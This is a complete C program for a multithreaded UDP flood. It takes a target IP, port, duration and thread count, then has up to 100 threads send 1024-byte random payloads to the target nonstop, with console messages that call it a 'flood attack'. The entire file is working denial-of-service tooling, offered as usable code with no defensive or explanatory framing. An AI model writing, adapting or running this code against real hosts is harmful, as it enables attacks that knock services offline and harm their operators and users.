#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

// Constants
#define PAYLOAD_SIZE 1024  // Size of UDP payload
#define MAX_THREADS 100    // Maximum threads allowed
#define MIN_THREADS 1      // Minimum threads allowed

// Function prototype
void *udp_flood(void *arg);

// Structure for thread arguments
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
} ThreadArgs;

void generate_payload(char *payload, size_t size) {
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    size_t chars_len = strlen(chars);

    for (size_t i = 0; i < size; ++i) {
        payload[i] = chars[rand() % chars_len];
    }
}

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;

    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up target address
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);

    if (inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        close(sock);
        pthread_exit(NULL);
    }

    // Generate random payload
    char payload[PAYLOAD_SIZE];
    generate_payload(payload, PAYLOAD_SIZE);

    // Start flooding
    printf("[Thread %d] Flooding %s:%d for %d seconds...\n", args->thread_id, args->target_ip, args->target_port, args->duration);
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < args->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("[Thread] Send failed");
        }
    }

    close(sock);
    printf("[Thread %d] Completed flood.\n", args->thread_id);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads < MIN_THREADS || threads > MAX_THREADS) {
        printf("Error: Threads must be between %d and %d.\n", MIN_THREADS, MAX_THREADS);
        return EXIT_FAILURE;
    }

    printf("Starting UDP flood attack on %s:%d with %d threads for %d seconds...\n", target_ip, target_port, threads, duration);

    pthread_t thread_pool[threads];
    ThreadArgs thread_args[threads];

    // Initialize threads
    for (int i = 0; i < threads; ++i) {
        thread_args[i].target_ip = target_ip;
        thread_args[i].target_port = target_port;
        thread_args[i].duration = duration;
        thread_args[i].thread_id = i + 1;

        if (pthread_create(&thread_pool[i], NULL, udp_flood, &thread_args[i]) != 0) {
            perror("Failed to create thread");
            return EXIT_FAILURE;
        }
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; ++i) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("UDP flood attack completed.\n");
    return EXIT_SUCCESS;
}
